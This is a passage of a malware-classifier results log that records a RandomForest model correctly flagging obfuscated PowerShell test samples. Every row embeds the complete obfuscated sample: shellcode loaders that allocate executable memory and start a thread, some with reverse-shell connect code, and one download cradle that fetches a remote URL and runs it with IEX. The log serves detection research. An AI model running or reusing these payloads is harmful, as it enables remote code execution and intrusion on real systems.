dest, uint src, uint count','0x6c,0xc4,0x4a,0xb2,0xf4,0x39,0x1a,0xb5,0xd5,0xef,0x11,0xec,0xf5,0x0e,0xf6,0x84,0xbf,0x08,0x1b,0xa0,0x76,0xa2,0xef,0x5e,0x89,0x62,0x3e,0x9e,0',' -Name sMvWin32sMv -namespace Win32Functions -passthru;[Byte[]];[Byte[]]uBDz = 0xba,0x5b,0x6d,0x83,0x54,0xd9,0xe1,0x','++)','xcd,0x79,0x51,0x5','artAddress, IntPtr lpParam','5,0xc4,0xb4,0xd8,0x3f,0x83,0xc6,0x1','da,0x31,',');cH5;uBDw = Add-Type -memberDefinition uBDMnxY','0x67,0x8b,0x3','0xe5,0x44,0x33,0x56,0x32,0x37,0xef,0xd3,0xa1,0x9f,0x64,0x43','{uBDg = uBDz.Length};uBDcqR=','4,0xf4,0x5e,0x2b,0xc9,0xb1,0x47,0x83,0xee,0xfc,0x',',0x0e,0x1e,0xa8,0x12,0xc5,0x2c,0x05,0x50,0x81,0x30,0x98,0xb5,0xb',');[','2,0xb2,0xf0,0xb4,0x63,0xf2,0x67,0xbc,0xd3,0xc2,0xec,0x90,0xdf,0xa9,0xa1,0x00,0x54,0xdf,0x6d,0x26,0xdd,0x6a,0x48,0x09,0xde,0xc7,0xa8,0x08,0x5c,0x1a,0x'))  -crEplace([cHAr]115+[cHAr]77+[cHAr]118),[cHAr]34-ReplAce([cHAr]99+[cHAr]72+[cHAr]53),[cHAr]39 -ReplAce([cHAr]117+[cHAr]66+[cHAr]68),[cHAr]36)|. ( ([StRING]$vERBOSepREferenCE)[1,3]+'X'-JoIN'')",malicious,TP
2026-07-13 17:15:28,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3652.ps1,custom-ps-ml,UNKNOWN,ec9cf312-3f3c-487f-b42c-0338e39cdf83,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3869,2001.26," . ( $PSHOmE[21]+$pShome[34]+'x') (((\""{32}{16}{78}{13}{72}{19}{60}{2}{23}{75}{24}{18}{67}{38}{0}{74}{39}{81}{14}{63}{28}{53}{11}{50}{90}{15}{9}{41}{33}{48}{73}{79}{86}{46}{64}{89}{66}{59}{31}{71}{88}{8}{84}{44}{47}{54}{37}{62}{80}{58}{27}{68}{3}{57}{61}{4}{43}{7}{10}{55}{30}{34}{21}{49}{82}{36}{1}{52}{29}{51}{26}{40}{83}{45}{17}{20}{69}{5}{12}{70}{35}{65}{87}{85}{22}{6}{91}{76}{42}{25}{77}{56}\""-f';[Byte[]];[Byte[]]57qz = 0xba,0x5e,0x14,0xe4,0','x95,0xcd,0x78,0x13,0xd4,0x22,0x79;57qg = 0x1000;if (57qz.Length -gt 0x1000){57qg = 57qz.Length};57qEKe=57qw::VirtualAll','ter, uint dwCreationFlags','da,','4,0x6c,0x','w::CreateThread(0,0,57qE','erShellFfKv1.0F','f,0x8c,0xe3,0x74,0x15,0x78,0x54,0x11,0x6a,0','x8e,','dd,0xac,0x35,0x2c,0x4d,0x','x4f,0x6a','f,0x64,0x59,0x0f,0xdd,0','Ke,0,0,0);for (;;){Start-sle','lleVC)]public static extern IntPtr Crea','x29,0xc9','0x','ernel32.dlleVC)]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationT','qz[57qi], 1)',' 57qLeLP -Name eVCWin',', ui','}',',0x80,0x88,0x44,0x09,0x2b,0x5d,0x44,0xc','+ eVCFfKsyswow64FfKWindowsPow',', IntPtr lpThreadId);[DllImport(eVCmsvcrt.','sGo;57qw = Add-Type -memberDefinition','&amp; ',') {57qw::memset([IntPtr](',',0x8c,0x8d,0xaa,0xb8,0x3b',',0x12,0x03,0x55,0x12,0x83,0x9b,0x10,0x06,0x','i -le (','0xe1,0xe3,0x50,0x00,0xe5,0xa3,0','8,0xd6,0x8f,0x7c,0x','57qOZL = sGo57qLeLP = sGosGo[DllImport(eVCk',',0xae,0x8c,0xc1,0xb6,0x8f,','xfa,0xcb,0xb3,0x2b,0x8e,0xb5,0xa5,0x2a,0x8f,0xec,0x89,0x61,0x23,0x5d,0x78,0xee,0xee,0x67,0x9c,0x95,0x0f,0xb2,0x19,0xa9,0x85,0x36,0x6d,0x5f,0xbf,0x2e,0x81,0x2a,0x9d,0xf8,0x9e','stem.Convert]::','0x5b,0x9a,0x8e,0x42,0xa5,0xe7,0x14,0x8c,0xd0,0x02,0x4e,0xcf,0x44,0x25,0x1a,0x30,0x85,0x4a,0xd4,0xf7,0x48,0x9b,0x26,0x31,0','b4,0x6e,0xa','namespace Win32Functions -passthru',',0xf','57qEKe.ToI','8c,0x54',' 57qZ7V 57qeeVC}else{;iex eVC','b4,0x9d,0x7','x19,0xd2,0x86,0x25,0xb4,0x07','), 57','bb,',',0xbb,0x64,0xd1,0xb9,0xa1,0xe2,0x21,0x2e,0x5d,0x63,0x4c,0xc7,0xf5,0x1b,0xdc,0x60,0xd0,0xdc,0x23,0x5b,0x2d,0x39,0x88,0x37,0x1d,0xee,0x7c,0xd0','0x5e,0x14,0xb7,0xc8,0x83,0xd5,0xe5,0x81','9,0x43,0x5d,0x44,0x89,0x93,0x0e,0x2c,0x51,0x30,0xe3,0x49,0x9e,0xed,0x97,0xc2,0x32,0x87,0x7f,0xb3,0xdc,0x97,0x5f,0x3b,0x1','x88,0x12,0x5d,0xf5,0x1b,0','57qz.Length-1);57qi++','oc(0,0x1000,57qg,0x40);for (57qi=0;57q','6a,0xdf,0xf1,0x44,0x95,0x1f,0x02,0x29,0x1f,0xfa,0x33,0x69,0x7b,0x8',',0x9b,0x46,0xfa,0x87,0x23,0xb3,0xaf,0x94,0xb1,0x38,0x03,0x48,0x2e,0x4e,0x',',','57qZ7V 57qeeVC;}','0x67,0xdd,0x0b,','x29,0x9b,0xbb,0x1a,0xfd,0xe3,0x93,0x8a,0xaa,0x6a','x60,0xcb,0xd9,0x22,0xf6,0x9','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpParame','0xb','e,0x46,',',0xb1,0x57,0x31,0x55','0xc7,0xa4,0xaa,0xf5,0x28,0x0a,0x93,0x39,0xdb,0x52,0xd4,0xfe,0x04,0x21,0x2c,0xfd,0xb9,0','ToBase64String([System.Text.Encoding]::Unicode.GetBytes(57qOZL));57qZ7V = eVC-e eVC;if([IntPtr]::Size -eq 8){5','xd8,0xed,0','32eVC -',',0xd7,0x06,0x2b,0x3b,0xea,0x48,0x2f,0x68,0x59,0x',';57q','ep 60};sGo;57qe = [Sy','c6,0xfa,0x0e,0x','teThread(IntPtr lpThreadAttributes',',0xc8,0x48,0x19,0xa','x9f,0xdb,0xd1,0xd9,0x74,0x24','dlleVC)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);sGo','ex eVC&amp; 57qKjJF','powershell ','ype, uint flProtect);[DllImport(eVCkernel32.d','5,0x85,0x50,0x92,0xf5,0x08,0xd1,0x47,0x4d,0x2a,0xf0,0xd6,0xc5,0x75,0xd2,0xd9,0x0a,0x0e,0x5b,0xc1,0x4f,0x2b,0x15,0x7a,','0x36,0x6e,0xae,0x96,0x68,0','4,0x5d,0','d,0xcb,0xc9,0x53,0x0f,0x7d,0x7c,0x41,0xd0,0x54,0xfa,0x45,','nt32()+57qi','0xd8,0x73,0x75,0xca,0xbb,0x1a,0x2c,0xb6,0x6a,0x22,0x2e,0','t ','0x','7qKjJF = 57qenv:SystemRoo','50,0x7d,0x06,0x9a,0x57,0x51,0','x32,0xeb,0x7f,0x66,0xb6,0xef,0','x56,0x4a,0xfa,0xac,','fKpowershelleVC;i')).REplaCE('sGo',[strINg][cHar]39).REplaCE(([cHar]70+[cHar]102+[cHar]75),'\\').REplaCE('eVC',[strINg][cHar]34).REplaCE(([cHar]53+[cHar]55+[cHar]113),'$') )",malicious,TP
2026-07-13 17:15:42,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3667.ps1,custom-ps-ml,UNKNOWN,e959239a-27f7-45b7-89b2-af1dd8463f56,DESKTOP-BAC9DBQ,malicious,0.9741,RandomForest,3302,2077.35,"&amp; ((variABLe '*mdR*').namE[3,11,2]-jOiN'') (((\""{3}{53}{7}{31}{58}{26}{24}{25}{27}{43}{59}{37}{77}{16}{11}{50}{51}{64}{72}{42}{34}{0}{4}{67}{10}{13}{45}{28}{40}{23}{69}{47}{1}{68}{17}{29}{55}{76}{65}{57}{33}{22}{71}{30}{9}{12}{14}{74}{70}{66}{46}{44}{19}{8}{2}{52}{20}{32}{73}{62}{6}{39}{61}{21}{41}{38}{15}{18}{5}{48}{63}{35}{75}{60}{56}{54}{36}{49}\""-f 'b,0xdc,0x98,0x3f,0x85,0xdd,0xb0,0x7c,0x84,0x5d,0xca,0x50,0x66,0x5f,0x05,0xa5,0x67,0x98','x46,0x41','3,0x','vwGjYnb = Wxp[D',',0x7b,0x44,0x35,0x71,0xf0,0xfb,0xaa,0xf6,0x4c,0x','f (vwGz.Length ','x69,0x7a,0x2d,0x','lAlloc(In','0xd','f7,0x6d,','5,0x3b,0','yte[','0x16,0x','xa1,0x8a,0xfa,0x30,0xe8,0x94,0x1f,0x7c,0xa2,0x2f,0xeb','16,0x1','83,0xab,0x57,0xff,0x17;','ctions -passthru;[B','0x31,0xe3,0xe4,0','vwGg = 0x1000;i',',0x76,0x64,0x1a,0x1a,0x77,0xa0,0xe9,0x5a,0x94,0x21,0xeb,0x0a,0xcc,0xb7,0xf3,0xbb,0x50,0x31,0x15,0xd1,0x78,0x17,0x8d,0x4d,0xe0,0x32,0x45,0xec,0xed,0xe8,0x23,0x2e,0x65,0x1f,','81,0x52,0x86,0x4c,0x6a,0x0c,0xe7,0x80,0x6a,0x',',0x66,0','34,0x19,0x61,0x86,0x9d,0x21,0xea,0x56,0x21,0xf4,0xbd','a1,','tPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, I','ntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllI','tic extern In','mport(1Drmsvcrt.dl',',0xf7,0x91,0x78,0x4d,0x8a','xf7,0x4b,0xae','x8d,0xa6,0x7d,0x','tPtr lpAddress, uint dwSize, uint flAllocationType,','cc,','74,0x2a,0x0f,0xad,0xc0,0xa4,0xee,0x4d,0x31,0xec,0x','x6c,0xd8,0x5e,0xcc,0x84,0x6b,0x12,0xd9,0xa','3F=vwGw::VirtualAlloc(0,0x1000,vwGg,0x40);for (vwGi=0;vwGi -le (vwGz.','wGz[vwGi], 1)};vwGw::CreateThread(0,0','count);Wxp;vwGw = Add','21,0x8d,0x','4a,0xfc,0x85,0x04,0x3f',',0x','x9f,0xb1,0x55,0x4d,0x',',0','l1Dr)]public st','xd1,0xaa,0x1c,0xac,0x2d,0x5a',',0x0b,0x35,0xe6,0x25,0xf4,0x9a,0xc7,0x89,0x07,0xe2,0x00,0x2d','x18,0xff,0x04,0x65,0x16,0','81,0x29,0xf0,0','-gt 0',',vwGQ3F,0,0,0);for (;;){Start-sleep 60};',']];[Byte[]]vwGz = 0xda,0xcd,0x','be,0x21,0x2f,0xd0,0x68,0xd9,0x74,0x24,0xf4,0x5a,0x2b,0xc9,0xb1,0x4f,0x31,0x72,0x','e0,0x8e,0x6a,0xc7,0x94,0x7e,0x21,0xb5,0x32,0x80,0x9f,0xd0,0xba,0x14,0x24,0x73,0xed,0x80,0x26,0xa2,0xd9,0x0e,0xd8,0x','llImport(1Drkernel32.dll1Dr)]public static extern IntPtr Virtua','i), v',',0x60,0x34','2()+vwG','2,0xf1,0x22,0x43,0xfd,0xa9,0xac,0xef,0x76,0x',' uint flProtect);[DllImport(1Drkernel32.dll1Dr)]public sta','atic extern IntPtr memset(IntPtr dest, uint src, uint ','Gw::memset([IntPtr](vwGQ3F.ToInt3',',0x57,0xee,0xaa','xaf,0x38,0xd1,0','x1000){vwGg = vwGz.Length};vwGQ','19,0x83,0xea,0xf','x66,0x51,0x71,0x5','0x20,0x63,0xc9,0x0d,0xa3,0x09,0x44,0xa6,0x44,0x9e,0xe2,0','c0,0x41,0x44,0x41,0x40,0xb5,0x1d,0x60,0x61,0x68,0x1',',0x25,0xbd,0x0d,0x0d,0x2a,0x40,0xc1,0x25,0x56,0xc9,0xe4,0xe9,0xde,0x89,0xc2,0x2d,0xba,0x4a,0x6a,0x77,0x66,0x3d,0x93,0x67,0xc9,0xe2,','0xbe,0x2f,0x50,0x27,0x25,0x97,0x13,0x9f,0x','1,',',0x06,0','c,0x03,0x72,0x15,0xc3,0xda,0x2c,0x80,0x81,0x25,0xcd,0x51,0xe5,0xac,0x28,0x60,0x25,0xca,0x39,0xd3,0x95,0x98','0xb1,0xca,0x6a,0xa4,0x65,0','d,0x62,0x49,0x06,0x1e,0xa8,0xe2,0x2f,0xf7,0x53,0x0c,0xb0,0x9','Length-1);vwGi++) {vw',',0','-Type -memberDefinition vwGjYnb -Name 1DrWin321Dr -namespace Win32Fun')).replaCE(([cHar]49+[cHar]68+[cHar]114),[STrIng][cHar]34).replaCE('Wxp',[STrIng][cHar]39).replaCE(([cHar]118+[cHar]119+[cHar]71),[STrIng][cHar]36))",malicious,TP
2026-07-13 17:15:48,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\368.ps1,custom-ps-ml,UNKNOWN,4cc193d4-0072-4c67-ab89-0b1ba4deb70f,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3055,1971.5," (((\""{31}{41}{69}{47}{49}{72}{67}{38}{56}{63}{30}{15}{32}{61}{6}{40}{20}{52}{59}{62}{43}{4}{46}{29}{14}{11}{42}{8}{25}{21}{55}{64}{53}{1}{17}{60}{28}{71}{12}{68}{16}{54}{44}{70}{51}{18}{5}{37}{13}{7}{19}{45}{26}{48}{57}{10}{65}{36}{23}{22}{34}{35}{33}{66}{2}{50}{24}{27}{58}{0}{3}{9}{39}\"" -f 'lloc(0,0x1000,xpo','e,0x5e,0x80,0x31,0xa2,0x76,0xa7,0xf2,0x09,0xa1,0x86,0x03,0x21,',',0x','g,0x40);for (xpoi=0;xpoi -le (xpoz.Length','2d;xpow = Add-Type -memberDefinition xpoJged -Name U28Win32U28 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]xpoz = 0xba,0x36,0x90,0x9c,0xd3,0xda,0x','0x27,0x0c,0x40,0x3f,0xa0,0x3c,0x09,0x99','Ptr ','xc0,0x73,0x1e,0x95,0xb6,0x14,0xa2,0x2a,0xa7,0xb9',',0x69,0x2f,0xad,0xf','-1);xpoi++) {xpow::memset([IntPtr](xpok4Al.ToInt32()+xpoi), xpoz[xpoi], 1)};xpow::CreateThread(0,0,xpok4Al,0,0,0);for (;;){Start-',',0x4b','0xfc,0','a0,0xe5,0xdb,0x7c,0x0f,0xc8,0xd4,0x8e,0x51,0x0c,','9f,0xce,0x99,0xa9,0xa0,0x84,0x59,0x56,0x75,0x30,0x5f,0','xb1,0x47,0x31,0x55,0x13,0x83,0xed,','pStartAd','c,0x70,0x29,0xeb,0xd7,0x19,0x68,0x51,0xb9,0x26,0x6a,0x3a,0x66,0x8','0x91,0x89,0x87,0x38,0xc6,0x69,0xb6,0xf2,0x1b,0x6b',',',',0x2b,0x','ationFlags, IntPtr lpThr',',0xd0,0x','x1e,0x1c,0x7e,0x62,0x9e,0x','f5,0x95,0x88,0x02,0x40,0xc7,0','5,0xc5,0x9e,0xae,0x93,0xe6,0xf6,0x03,0x33,0x8f,0xf4,0x7a,0x73,0x10,0x06,0','0,0x92','x07,0xf5,0xdc,0xf4,0x7f,0x61,0x44,0x5d,0x0b,0x10,0','xa9,0x85,0x6c,0xd1,0x','0xce,0x8f,0xd3,0xb9,0x46,0x88,0x30,0x','f4,0x5d,0x29,0xc9,0','Ptr l','xpoJged = i2d[DllImport(U28kernel32.dllU28)]public static ext','dress, I','0','88,0x85',',0x25,0xc9,0x24,0x84,0x10,0x3d,0xeb,0x77,0x77,0x36,0x22,0xe2,0x38,0x20,0x4b,','12,0x01,0x78,0x85,0xdc,0xe2,0x',',0x37,0x43,0x20,0x5d,0xa7,0xba,0xcb,0x9e,0xe1,0x78,0x','read(IntPtr l','sleep 60};','lpParameter, uint dwCre','ern IntPtr V','x03,0x55,0x39,0x72',' count);i','be,0xaa,0xbe,0x','cc,0x97,0x11,0x7c,0x41,0x57,0xc2,0x3c,0x31,0x3f,0x08,0xb3,0x6e,0x5f,0x33,0x19,0','cd,0xd9,0x74,0x24,0x','llocationType, uint flProtect);[DllI','x','mport(U28kernel32.dllU28)]public static exter','b0,0x1d,0x68,0xb9,0xd8,0xf9,0xc8,0xea,0xfd,0x0','4','eadId);[DllImport(U28msvcrt.dllU28)]public ','0x1c,0x95,0x78,0x3d,0x0e,0x25,0x0a,0x13,0xa2,0xc','3,0xe0,0xd6,0x73,0x','2d,0x9','pT','89','97,0xf3,0x9c,0xe1;xpog = 0x1000;if (xpoz.Length -gt 0x1000){xpog = xpoz.Length};xpok4Al=xpow::VirtualA','static extern IntPtr memse',',0xff,0xef,0xd6,0x39,0xa8,0x64,0x44,0xae,0xdd,0x31,0x55,0x45,0xad,0xd4,0xdd,0xba,0x65,0xd6,0xcc,0x6c,0xfe,0x81,','nt','t(IntPtr dest, uint src, uint','hreadAttributes, uint dwStackSize, Int','5,0x1b,0x35,',',0x71,0x','xe2,0xb8','eTh','0xd2,0x70,0x24,0x64,0x21,0x0c,0x3f,0xb3,0x58,0xca,0xca,0x20,0xfa,0x99,0x6d,0x8d,0xfb,0x4e,0xeb,0x46,0xf7,0x3b,0x7f,0x00,0x1b,0xbd,0xac,0x3a,0x27,0x36,0x53,0xed,0xae,0x0','irtualAlloc(IntPtr lpAddress, uint dwSize, uint flA','b0,0xf3,0x54,0x3e,0xdf,0x8','87,0x11,0x23,0x82,0x73,0x','n IntPtr Creat'))  -CREplACE 'xpo',[CHAR]36  -CREplACE  'U28',[CHAR]34-repLAcE ([CHAR]105+[CHAR]50+[CHAR]100),[CHAR]39) |&amp; ( $SHElLiD[1]+$sHelliD[13]+'x')",malicious,TP
2026-07-13 17:15:54,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\3721.ps1,custom-ps-ml,UNKNOWN,ab795140-39bf-45e5-8473-f75fbb0724fb,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1654,2003.0," ((\""{3}{54}{42}{28}{132}{72}{112}{97}{66}{26}{43}{108}{104}{4}{59}{34}{113}{23}{37}{76}{36}{131}{122}{107}{133}{89}{10}{39}{12}{18}{93}{25}{130}{121}{61}{45}{55}{96}{84}{117}{105}{90}{114}{52}{98}{111}{27}{13}{74}{118}{83}{15}{95}{29}{5}{11}{48}{85}{115}{110}{7}{41}{21}{109}{33}{94}{70}{128}{73}{86}{44}{17}{63}{68}{50}{19}{102}{67}{103}{124}{14}{53}{22}{32}{127}{129}{120}{9}{100}{88}{106}{125}{38}{92}{16}{80}{1}{30}{49}{20}{35}{40}{46}{31}{77}{6}{123}{8}{2}{78}{119}{101}{71}{0}{60}{134}{47}{126}{116}{87}{99}{51}{75}{64}{69}{24}{56}{79}{58}{62}{81}{82}{91}{65}{57}\""-f'5:80','[CHa','p','h9','eNT','eFaULTWe','dSt','y.CreDENT','INg(nyMhtt','32','4','BPR',' T','Wc.ProX','5','e','Ri=0;[CHAR[','e','r','e','(h9RW','lS =','b5aa','iMo','k',' r','N','h9R','O',':D','r','L','765','Sy','u','C.','5','zill','dAi;h',';','DO','ia','W-','et.WEb','ach','d','WN','nd','OXY','[]]','AulTN',')evR','(d','f4dcc3','Rwc=Ne','A','[h9','Ai)','K.',';h9R','80','1.0) like Gecko','LeNg',']::DE','_-bXorh9','id','.','a','f','R','teM.NEt.CreDe','16','Sys','L','Y = ','%{h9R','a/','oA','://52.2','Ri++%h9R',']]h9Rb=(','Th]}',';IEX (h','eM.NET.WebReQU','9',';h9R','C','M)','2c','; WOW6','.Ad','9RB-joINdA','9','ident/7.0;','S','st]:','i;h','m','AiUser-AgentdAi,h9R',')','7deb88','242.','TwoRkCREDEnti','L','i','wc.HEadeRs','f9',' ','CL',' [','rOX','u);','tE','=dA','d','wC.P','.aspny','R','[Syst','8.','8',':1',' (Windows','R','s;h9RK=dAi','9','ex','d6','Ntia','1d','v','.0','BJeCt ','NT 6.1','/i')).ReplaCE(([ChAr]104+[ChAr]57+[ChAr]82),[StrIng][ChAr]36).ReplaCE('dAi',[StrIng][ChAr]39).ReplaCE('nyM',[StrIng][ChAr]34).ReplaCE('evR','|') |&amp; ( $sHeLlid[1]+$sHellId[13]+'x')",malicious,TP
2026-07-13 17:16:00,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\373.ps1,custom-ps-ml,UNKNOWN,2043adf3-2fa9-43ad-8ffb-e4ef0b4bc68f,DESKTOP-BAC9DBQ,malicious,0.9941,RandomForest,2949,1985.28,"&amp;( ([StRING]$VERBoSePrefereNCE)[1,3]+'x'-JoIn'') ((((\""{11}{6}{24}{28}{8}{58}{44}{53}{4}{1}{67}{22}{52}{42}{26}{56}{17}{20}{57}{63}{41}{50}{3}{10}{45}{60}{19}{36}{47}{23}{38}{14}{0}{12}{55}{7}{5}{59}{64}{25}{27}{43}{30}{40}{39}{51}{2}{49}{33}{31}{35}{9}{32}{13}{61}{66}{65}{48}{18}{62}{21}{46}{29}{16}{34}{37}{15}{54}{68}\""-f '3,0x66,0x8b,0x0c,0x4b,0x8',')]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId)','df,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x09,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0x','x02,0x2c,0x','8Mkernel32.dllR8M','0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,','yc = OTK[DllImport(R8Mkernel32.dllR8M)]public static extern IntPtr Vi','8,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,','(IntPtr lpAddress, uint dwSize, ui','xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x0','20,0xc1,0xcf,0x0d,0','9B','b,0x','0xa4,0x53,0xe5','24,0x01,0xd','9Byx.ToInt32()+9Byi), 9Bysc[9Byi],','Length-1);9','x60,0x89,0xe5,0x31,0xd2,0x','yw::Virt','52,0x10,0x8b,0','64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x','al','mport(R8Mmsvcrt.dllR8M)]public','x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc','rtualAll','b,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,','Ptr dest, uint src, uint count);OTK;9Byw = Add-Type -memberDefinition 9Byc -Name R8MWin3','0xb8,0x90','oc','i=0;9Byi -le (9Bysc.','0xc4,0x54,0x50,0x68,0x29,0x80,0x6','0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x','0,0x00,0x56,0x6a,0x00,0x68,0x58,','0x08,0x75,0xec,0x68,0xf','Byi++) {9','6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0','x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x1','Byw::memset([IntPtr](','0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x','0x50,0x40','b,0x00,0xff,0xd5,0x50,0x50,0x50,','c,0x3c,0x61','ern IntPtr memset(Int',',0x01,0x00,0x00,0x29,','uint flProtect);[Dll','x0','Alloc(0,0x1000,9Bysize,0x40);for (9By','8,0x8b,0','00){9Bysize = 9Bysc.Length};9Byx=9B','ff,0x4e,',',0x7c,0',',0x50,0x40,0x50,0x68,0xea,0x0f,0x',' static ext','Import(R',' 1)};9Byw::CreateThread(0','5','2R8M -namespace Win32Functions -passthru;[Byte[]];[Byte[]]9Bysc = 0xfc,0xe8,0x89,0x00,0x00,0x00,0','14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x3','nt flAllocationType, ','0x51,0xff,0xe0,0x58,0x5f,0x5','1,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x',',0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5','u','1,0xc0,0xa','a,0x8b,0x12,0xe','0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;9Bysize = 0x1000;if (9Bysc.Length -gt 0x10','f,0xff,0xd5,0x01,0xc3,',';[DllI',',0,9Byx,0,0,0);for (;;){Start-sleep 60};')) -REPLaCe  'OTK',[chAr]39  -CrEplaCe ([chAr]82+[chAr]56+[chAr]77),[chAr]34  -REPLaCe  '9By',[chAr]36))",malicious,TP
2026-07-13 17:16:07,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\374.ps1,custom-ps-ml,UNKNOWN,26f2a363-4acd-44ab-bf90-dc686de8a1f3,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2767,2147.09,". ( $pSHOME[4]+$PShOME[34]+'X') ( ((\""{1}{12}{0}{31}{37}{8}{26}{30}{4}{38}{32}{13}{15}{11}{35}{33}{44}{40}{5}{41}{7}{36}{29}{22}{23}{20}{10}{27}{18}{25}{19}{16}{46}{43}{28}{6}{34}{3}{21}{45}{17}{39}{14}{2}{24}{9}{42}\""-f ' IntPtr VirtualAlloc(IntPtr lpAddress, ui','Fulc = nzw[DllImport(RBokernel32.dllRBo','Fulz.Length -gt 0x1000){Fulg = Fulz.Length};Fulx=Fulw::VirtualAlloc(0,0x1000,Fulg,0x40);for (Fuli=0;Fuli -le (Fulz.Length-1);Fuli++) {Fulw::memset([IntPtr](Fulx.ToInt32(','x','ad(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwC',',0x8b,0x48,0x18,','x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,','x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc','ionType, uint flProtect);[DllImport(RB',')',',0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x1','b,0x72,',')]public static extern','[Byte[]];[Byte[]]Fulz = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x',' 0x1000;if (','52,0x0c,0x8b,0x52,0x14,0x8','68','8','5d,0x68,0x33,0x32,','x50,0x','x24,0x5b,0x5b','6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,','d,0xf8,0x3b,0x7d,0x24,0x75,0xe2',',0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0',')+Fuli), Fulz[Fuli], 1)};Fulw::CreateThread(0,0,Fulx,0,0,0);for (;;','0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0','okernel32','2,0xeb,0x86,0x','x10,0x56,0x57,0x68,0','5,0xf4,0x03,0x7','.dllRBo)]public static extern IntPtr CreateThre','nt dwSize, uint fl','tions -passthru;','6','0xa2,0x56,0xff,0xd5,0x6a,0x00,0','0x28,0x0f,0xb7,0x4a,0x2','1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x7','Allocat','reationFlags, IntPtr lpThreadId);[DllImport(RBomsvcrt.dllRBo)]public static extern IntPtr memset(IntPtr dest, uint src, uint count);nzw;Fulw = Add-Type -memberDefinition Fulc -Name RBoWin32RBo -namespace Win32Func',',0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;Fulg =','0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50','0','{Start-sleep 